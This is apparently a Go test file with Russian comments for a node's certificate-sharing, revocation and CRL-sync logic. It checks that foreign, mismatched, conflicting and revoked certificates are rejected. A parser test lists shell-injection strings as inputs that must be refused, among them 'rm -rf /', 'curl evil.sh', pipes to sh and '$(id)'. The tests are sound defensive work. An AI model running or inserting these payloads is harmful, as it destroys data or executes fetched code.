package main

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

// newTrustStoreForCertShare собирает TrustStore с собственным CA и загрузкой
// сертификатов с диска — как это делает настоящий узел при старте.
func newTrustStoreForCertShare(t *testing.T, dataDir string) *TrustStore {
	t.Helper()

	if _, _, err := GenerateCA(dataDir, DefaultCALifetime); err != nil {
		t.Fatalf("GenerateCA: %v", err)
	}

	ts, err := NewTrustStore(dataDir+"/ca/ca-cert.pem", dataDir+"/ca/crl.pem")
	if err != nil {
		t.Fatalf("NewTrustStore: %v", err)
	}

	return ts
}

// TestCertShareAccepted — сосед принимает сертификат другого узла и тот
// попадает в peers/.
func TestCertShareAccepted(t *testing.T) {
	dir := t.TempDir()
	ts := newTrustStoreForCertShare(t, dir)

	caKey, _ := LoadCAKey(dir + "/ca/ca-key.pem")
	caCertPEM, _ := os.ReadFile(dir + "/ca/ca-cert.pem")

	// peer ещё не выдавался на этой машине — только его сертификат приходит.
	peer, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-peer", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("IssueCertificate: %v", err)
	}

	pkt := &DiscoveryPacket{
		Magic:     DiscoveryMagic,
		Version:   ProtocolVersion,
		Type:      PktCertShare,
		NodeID:    peer.NodeID,
		Timestamp: time.Now().Unix(),
		Payload:   mustReadFile(t, peer.CertPath),
	}

	stored, err := AcceptCertificate(dir, ts, pkt)
	if err != nil {
		t.Fatalf("сертификат соседа должен приниматься: %v", err)
	}
	if !stored {
		t.Fatal("сертификат должен быть сохранён")
	}

	// Файл лежит в peers/.
	path := PeerCertPath(dir, "beacon-peer")
	if _, err := os.Stat(path); err != nil {
		t.Fatalf("сертификат не сохранён в %s: %v", path, err)
	}

	// И подхватится при следующей загрузке TrustStore.
	ts2, err := NewTrustStore(dir+"/ca/ca-cert.pem", dir+"/ca/crl.pem")
	if err != nil {
		t.Fatalf("NewTrustStore после приёма: %v", err)
	}

	found := false
	for _, cert := range ts2.getTrustedCerts() {
		if cert.Subject.CommonName == "beacon-peer" {
			found = true
			break
		}
	}
	if !found {
		t.Fatal("сертификат соседа должен появляться в TrustStore")
	}

	// Ключ подписи зарегистрирован сразу: до перезапуска его ещё нет.
	if _, err := ts.SigningKey(peer.NodeID); err != nil {
		t.Fatalf("ключ подписи должен регистрироваться при приёме: %v", err)
	}
}

// TestCertShareRejectsForeignCA — сертификат от чужого CA не принимается.
func TestCertShareRejectsForeignCA(t *testing.T) {
	dir := t.TempDir()
	ts := newTrustStoreForCertShare(t, dir)

	otherDir := t.TempDir()
	if _, _, err := GenerateCA(otherDir, DefaultCALifetime); err != nil {
		t.Fatalf("GenerateCA (чужой): %v", err)
	}
	otherKey, _ := LoadCAKey(otherDir + "/ca/ca-key.pem")
	otherCertPEM, _ := os.ReadFile(otherDir + "/ca/ca-cert.pem")

	rogue, err := IssueCertificate(otherKey, otherCertPEM, otherDir, "beacon-rogue", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("IssueCertificate (чужое): %v", err)
	}

	pkt := &DiscoveryPacket{
		Magic:     DiscoveryMagic,
		Version:   ProtocolVersion,
		Type:      PktCertShare,
		NodeID:    rogue.NodeID,
		Timestamp: time.Now().Unix(),
		Payload:   mustReadFile(t, rogue.CertPath),
	}

	if _, err := AcceptCertificate(dir, ts, pkt); err == nil {
		t.Fatal("сертификат чужого CA должен отвергаться")
	}

	if _, err := os.Stat(PeerCertPath(dir, "beacon-rogue")); err == nil {
		t.Fatal("файл не должен сохраняться")
	}
}

// TestCertShareRejectsNodeIDMismatch — чужой сертификат под своим именем
// не принимается: ключ сертификата обязан давать NodeID пакета.
func TestCertShareRejectsNodeIDMismatch(t *testing.T) {
	dir := t.TempDir()
	ts := newTrustStoreForCertShare(t, dir)

	caKey, _ := LoadCAKey(dir + "/ca/ca-key.pem")
	caCertPEM, _ := os.ReadFile(dir + "/ca/ca-cert.pem")

	victim, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-victim", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("IssueCertificate: %v", err)
	}

	// NodeID пакета намеренно чужой: сертификат жертвы, NodeID злоумышленника.
	wrongID := [16]byte{0x41, 0x42, 0x43}

	pkt := &DiscoveryPacket{
		Magic:     DiscoveryMagic,
		Version:   ProtocolVersion,
		Type:      PktCertShare,
		NodeID:    wrongID,
		Timestamp: time.Now().Unix(),
		Payload:   mustReadFile(t, victim.CertPath),
	}

	if _, err := AcceptCertificate(dir, ts, pkt); err == nil {
		t.Fatal("несовпадение ключа и NodeID должно отвергаться")
	}
}

// TestCertShareRejectsCNConflict — для занятого CN с другим ключом
// сертификат не принимается. Так легитимная пере-выдача и атака
// неразличимы, поэтому конфликт — всегда ошибка, а не молчаливое
// перезатирание.
func TestCertShareRejectsCNConflict(t *testing.T) {
	dir := t.TempDir()
	ts := newTrustStoreForCertShare(t, dir)

	caKey, _ := LoadCAKey(dir + "/ca/ca-key.pem")
	caCertPEM, _ := os.ReadFile(dir + "/ca/ca-cert.pem")

	// Сначала принимаем настоящий сертификат узла.
	original, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-name", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("IssueCertificate: %v", err)
	}

	first := &DiscoveryPacket{
		Magic:     DiscoveryMagic,
		Version:   ProtocolVersion,
		Type:      PktCertShare,
		NodeID:    original.NodeID,
		Timestamp: time.Now().Unix(),
		Payload:   mustReadFile(t, original.CertPath),
	}
	if _, err := AcceptCertificate(dir, ts, first); err != nil {
		t.Fatalf("первый сертификат должен приниматься: %v", err)
	}

	// Читаем байты ДО пере-выдачи: IssueCertificate на то же имя перезапишет
	// cert.pem, и сравнение иначе шло бы уже с новым файлом.
	originalPEM := mustReadFile(t, PeerCertPath(dir, "beacon-name"))

	// Пере-выдача выдаёт новый ключ и новый NodeID на то же имя.
	reissued, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-name", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("пере-выдача: %v", err)
	}

	second := &DiscoveryPacket{
		Magic:     DiscoveryMagic,
		Version:   ProtocolVersion,
		Type:      PktCertShare,
		NodeID:    reissued.NodeID,
		Timestamp: time.Now().Unix(),
		Payload:   mustReadFile(t, reissued.CertPath),
	}

	if _, err := AcceptCertificate(dir, ts, second); err == nil {
		t.Fatal("конфликт CN с другим ключом должен отвергаться")
	}

	// Исходный сертификат остаётся нетронутым.
	if got := string(mustReadFile(t, PeerCertPath(dir, "beacon-name"))); got != string(originalPEM) {
		t.Fatal("сохранённый сертификат не должен подменяться конфликтующим")
	}
}

// TestCertShareRejectsRevoked — отозванный сертификат не принимается.
func TestCertShareRejectsRevoked(t *testing.T) {
	dir := t.TempDir()
	ts := newTrustStoreForCertShare(t, dir)

	caKey, _ := LoadCAKey(dir + "/ca/ca-key.pem")
	caCertPEM, _ := os.ReadFile(dir + "/ca/ca-cert.pem")

	peer, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-revoked", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("IssueCertificate: %v", err)
	}

	cert, err := loadCertPEM(peer.CertPath)
	if err != nil {
		t.Fatalf("loadCertPEM: %v", err)
	}

	if err := ts.Revoke(cert.SerialNumber, 1); err != nil {
		t.Fatalf("отзыв: %v", err)
	}

	pkt := &DiscoveryPacket{
		Magic:     DiscoveryMagic,
		Version:   ProtocolVersion,
		Type:      PktCertShare,
		NodeID:    peer.NodeID,
		Timestamp: time.Now().Unix(),
		Payload:   mustReadFile(t, peer.CertPath),
	}

	if _, err := AcceptCertificate(dir, ts, pkt); err == nil {
		t.Fatal("отозванный сертификат должен отвергаться")
	}
}

// TestPeerCertificatesFiltersNonPem — из peers/ читаются только .pem-файлы.
func TestPeerCertificatesFiltersNonPem(t *testing.T) {
	dir := t.TempDir()

	// Создаём структуру peers/ с мусором.
	if err := os.MkdirAll(PeersDir(dir), 0700); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	caKey, caCertPEM, err := GenerateCA(dir, DefaultCALifetime)
	if err != nil {
		t.Fatalf("GenerateCA: %v", err)
	}

	issued, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-good", time.Hour, RolePeer)
	if err != nil {
		t.Fatalf("IssueCertificate: %v", err)
	}

	good, err := os.ReadFile(issued.CertPath)
	if err != nil {
		t.Fatalf("чтение сертификата: %v", err)
	}

	// Кладём валидный сертификат, невалидный .pem и файл с другим расширением.
	if err := os.WriteFile(PeerCertPath(dir, "beacon-good"), good, 0644); err != nil {
		t.Fatalf("запись: %v", err)
	}
	if err := os.WriteFile(filepath.Join(PeersDir(dir), "broken.pem"), []byte("not a pem"), 0644); err != nil {
		t.Fatalf("запись: %v", err)
	}
	if err := os.WriteFile(filepath.Join(PeersDir(dir), "notes.txt"), []byte("текст"), 0644); err != nil {
		t.Fatalf("запись: %v", err)
	}
	// Подкаталог должен игнорироваться.
	if err := os.MkdirAll(filepath.Join(PeersDir(dir), "subdir.pem"), 0700); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}

	certs := PeerCertificates(dir)
	if len(certs) != 1 {
		t.Fatalf("ожидался 1 валидный сертификат, получено %d", len(certs))
	}
	if certs[0].Subject.CommonName != "beacon-good" {
		t.Fatalf("неверный CN: %s", certs[0].Subject.CommonName)
	}
}

// TestParseSCPSource — валидация источника для sync-crl.
func TestParseSCPSource(t *testing.T) {
	user, host, path, err := parseSCPSource("admin@192.168.1.4:/home/admin/crl.pem")
	if err != nil {
		t.Fatalf("корректный источник должен разбираться: %v", err)
	}
	if user != "admin" || host != "192.168.1.4" || path != "/home/admin/crl.pem" {
		t.Fatalf("неверный разбор: %s %s %s", user, host, path)
	}

	// Инъекция в shell — главный кейс этой проверки.
	for _, bad := range []string{
		"admin@host:/p; rm -rf /",
		"admin@host:/p && curl evil.sh",
		"admin@host:/p | sh",
		"admin@host:/p > /etc/passwd",
		"admin@host:/p `whoami`",
		"$(id)@host:/p",
		"no-at-sign:/p",
		"@host:/p",
		"admin@host",
		"admin@host:",
		"",
		"   ",
	} {
		if _, _, _, err := parseSCPSource(bad); err == nil {
			t.Fatalf("источник %q должен отвергаться", bad)
		}
	}
}

// TestRevokeBeaconByNode — отзыв по имени вместо ручного ввода серийника.
func TestRevokeBeaconByNode(t *testing.T) {
	dir := t.TempDir()

	_, caCertPEM, err := GenerateCA(dir, DefaultCALifetime)
	if err != nil {
		t.Fatalf("GenerateCA: %v", err)
	}
	caKey, _ := LoadCAKey(dir + "/ca/ca-key.pem")

	admin, err := IssueCertificate(caKey, caCertPEM, dir, "beacon-nas", time.Hour, RoleServer)
	if err != nil {
		t.Fatalf("IssueCertificate: %v", err)
	}

	// Индекс заполняется так же, как в cmdProvisionBeacon.
	idx, _ := LoadCAIndex(dir)
	idx.Nodes["beacon-nas"] = NewEntry(admin.Serial, admin.NodeID)
	if err := SaveCAIndex(dir, idx); err != nil {
		t.Fatalf("SaveCAIndex: %v", err)
	}

	// Отзыв через функцию CLI: она вызывает cmdRevokeBeacon, которая печатает
	// и завершает процесс при ошибке, но здесь ошибки быть не должно.
	cmdRevokeBeaconByNode(dir, "beacon-nas")

	// CRL должен содержать этот серийник.
	ts, err := NewTrustStore(dir+"/ca/ca-cert.pem", dir+"/ca/crl.pem")
	if err != nil {
		t.Fatalf("NewTrustStore: %v", err)
	}
	if !ts.IsRevokedBySerial(admin.Serial) {
		t.Fatal("отзыв по имени должен попадать в CRL")
	}

	// Несуществующее имя обрабатывает CLI через os.Exit — здесь проверяем
	// только то, что индекс читается и такого имени в нём нет.
	idx2, err := LoadCAIndex(dir)
	if err != nil {
		t.Fatalf("индекс должен читаться: %v", err)
	}
	if _, ok := idx2.Lookup("beacon-нет-такого"); ok {
		t.Fatal("несуществующее имя не должно находиться")
	}
}

// mustReadFile читает файл или падает в тесте.
func mustReadFile(t *testing.T, path string) []byte {
	t.Helper()

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("чтение %s: %v", path, err)
	}

	return data
}
